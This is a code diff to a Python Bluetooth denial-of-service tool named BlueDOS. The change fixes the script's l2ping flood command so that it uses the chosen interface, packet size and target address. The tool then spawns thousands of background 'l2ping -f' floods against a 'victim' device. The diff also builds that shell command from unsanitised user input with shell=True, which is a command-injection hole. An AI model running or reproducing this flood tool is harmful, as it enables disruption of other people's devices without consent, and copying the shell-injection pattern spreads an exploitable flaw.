@@ -28,12 +28,14 @@ if os.geteuid() != 0:
     print(R+BOLD+"[!]"+W+" Please run the BlueDOS as root!")
     exit()
 
+hop = ["hci0", "", "600"]
+
 def main():
     try:
         print(banner)
-        inter = input(B+POD+"INTERFACE"+W+" (default: hci0) > ") or "hci0"
-        tar = input(B+POD+"TARGET"+W+" > ")
-        size = int(input(B+POD+"SIZE"+W+" (default: 600) > ") or 600)
+        hop[0] = input(B+POD+"INTERFACE"+W+" (default: hci0) > ") or "hci0"
+        hop[1] = input(B+POD+"TARGET"+W+" > ")
+        hop[2] = int(input(B+POD+"SIZE"+W+" (default: 600) > ") or 600)
         print(G+"-"*30+W)
         start = input("Do you want to start: (Y/n) ")
         if start == 'y' or 'Y':
@@ -42,7 +44,7 @@ def main():
             print(G+"[+]"+W+" Sending packets to the victim. Be patient!")
             try:
                 for i in range(1, 10000):
-                    xterm_1 = "l2ping -i inter -s size -f tar &"
+                    xterm_1 = "l2ping -i %s -s %s -f %s &" % (hop[0], hop[2], hop[1])
                     subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                     ts(2)
             except(KeyboardInterrupt, OSError):
